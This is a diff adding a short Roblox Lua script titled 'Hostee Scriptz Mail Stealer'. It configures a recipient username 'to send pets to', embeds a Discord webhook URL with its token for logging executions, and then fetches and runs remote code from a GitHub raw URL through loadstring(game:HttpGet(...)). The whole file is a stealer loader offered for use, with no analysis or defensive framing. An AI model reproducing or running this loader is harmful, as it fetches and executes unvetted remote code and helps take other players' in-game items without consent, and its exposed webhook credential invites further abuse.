@@ -1,0 +1,10 @@
+--{{ Hostee Scriptz Mail Stealer }}--
+
+--{{ Main Config }}--
+_G.UserNamey = "PiercePSX" --// Username To Send Pets To
+
+--{{ Webhook Config }}--
+_G.Webhooky = "https://discord.com/api/webhooks/1118892035047424052/HZWS9tjaTg4Vfcbo22AAOxWDlXYeJ_8CmefklT7XamfqClT9z0ids7X6Gf0DIrce2KpP" --// Discord Webhook For Executions
+
+--{{ Script }}--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/hostee.github.io/main/Mailstealer"))()
